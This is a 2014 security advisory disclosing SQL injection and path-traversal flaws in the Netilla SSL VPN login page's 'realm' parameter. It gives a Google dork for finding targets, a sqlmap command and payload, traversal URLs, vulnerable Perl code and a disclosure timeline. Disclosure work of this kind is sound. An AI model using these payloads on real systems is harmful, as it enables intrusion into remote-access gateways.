@@ -1,0 +1,137 @@
+Ultra Electronics / AEP Networks - SSL VPN (Netilla / Series A / Ultra
+Protect) Vulnerabilities
+ http://www.osisecurity.com.au/advisories/ultra-aep-netilla-vulnerabilities
+
+Release Date:
+ 02-Oct-2014
+
+Software:
+ Ultra Electronics - Series A
+ http://en.wikipedia.org/wiki/NetillaOS_NetConnect_by_Northbridge_Secure_Systems_(Secure_Remote_Access_SSL_VPN)
+
+Versions tested:
+ Version 7.2.0.19 and 7.4.0.7 have been confirmed as vulnerable. Other
+versions untested.
+
+Google Dork: inurl:/preauth/login.cgi
+Page 1 of about 321 results (0.25 seconds)
+
+URL:
+
+https://[target]/preauth/login.cgi?realm=local
+
+There are a few different issues with the 'realm' parameter.
+
+1) SQL injection. You can use sqlmap for this.
+
+./sqlmap.py -u "https://[target]/preauth/login.cgi?realm=abc" --level 5
+
+sqlmap identified the following injection points with a total of 927
+HTTP(s) requests:
+---
+Place: GET
+Parameter: realm
+    Type: boolean-based blind
+    Title: PostgreSQL stacked conditional-error blind queries
+    Payload: realm=-2661'); SELECT (CASE WHEN (9569=9569) THEN 9569
+ELSE 1/(SELECT 0) END);--
+---
+
+web application technology: Apache
+back-end DBMS operating system: Linux Red Hat
+back-end DBMS: PostgreSQL
+banner:    'PostgreSQL 8.3.4 on x86_64-redhat-linux-gnu, compiled by
+GCC gcc (GCC) 4.1.2 20070626 (Red Hat 4.1.2-14)'
+
+Funnily enough, a lot of the source code is commented with things like
+"#FIXME add param validation" as a reminder by the developer that the
+code doesn't validate input - but somehow made it into production.
+
+DB.pm line ~189 where realm is used in an SQL select:
+
+sub set_message {
+    my $self = shift;
+    warn(__PACKAGE__, "::set_message() called\n") if $self->{'debug'};
+
+    my ($key, $value) = @_; # FIXME add param validation
+
+    my $realm_name=$self->{'realm'};
+    my $c = $self->{'_dbh'};
+    my $locale = $self->{'locale'} ;
+    my $r      = $c->exec("
+                select * from set_realm_message('$realm_name',
+'$locale', '$key', '$value')
+                ");
+    if ($r->resultStatus ne PGRES_TUPLES_OK) {
+        return;
+    }
+    my $retval = $r->fetchrow;
+    return $retval;
+
+}
+
+2) The realm is also used in a perl based mkdir(). This allows you to
+create arbitrary folders, allows for path disclosure / checking files
+exist etc.
+
+Manager.pm line ~43:
+chown $uid, $gid, mkpath($path, 0);
+
+File.pm line ~160:
+my $parent = File::Basename::dirname($path);
+    unless (-d $parent or $path eq $parent) {
+        push(@created,mkpath($parent, $verbose, $mode));
+     }
+    print "mkdir $path\n" if $verbose;
+
+Examples:
+
+https://[target]/preauth/login.cgi?realm=../../../etc/hosts
+
+Error
+mkdir /tmp/netilla-cache/C11N_get_messages/../../../etc/hosts: File
+exists at /usr/lib/perl5/site_perl/5.8.8/Netilla/CONDA/Cache/Manager.pm
+line 43
+Back
+
+https://[target]/preauth/login.cgi?realm=../../../../bin/
+
+Error
+mkdir /tmp/netilla-cache/C11N_get_messages/../../../../bin: Permission
+denied at /usr/lib/perl5/site_perl/5.8.8/Netilla/CONDA/Cache/Manager.pm
+line 43
+Back
+
+The portal requires authentication to access "protected" areas but
+once you are authenticated, you can HTTP GET internal device
+configuration files and other resources that an authenticated user
+shouldn't be able to read.
+
+Credit:
+ This vulnerability was discovered by Patrick Webster.
+
+Disclosure timeline:
+ 28-May-2012 - Discovered during test.
+ 28-May-2012 - Vendor contact, referred to support and legal departments.
+ 19-Jun-2012 - Requested vendor update.
+ 20-Jun-2012 - Told to contact support email. Sent.
+ 19-Jul-2012 - Support request to close ticket. Told support no
+progress has been made. Support requires CVE to progress.
+ 23-Jul-2012 - Told support no CVE has been assigned. Support refuse
+to investigate without a CVE. Told to upgrade to newest release
+7.4.0.7. Confirmed as affected.
+ 14-Aug-2012 - Vendor support closing ticket, no investigation or patch.
+ 02-Oct-2014 - Public disclosure. Assumed vulnerable.
+
+ Note: Product is now known as NetillaOS by Northbridge Secure
+Systems. 2014 status unknown.
+
+About OSI Security:
+
+ OSI Security is an independent network and computer security auditing
+ and consulting company based in Sydney, Australia. We provide internal
+ and external penetration testing, vulnerability auditing and wireless
+ site audits, vendor product assessments, secure network design,
+ forensics and risk mitigation services.
+
+We can be found at http://www.osisecurity.com.au/
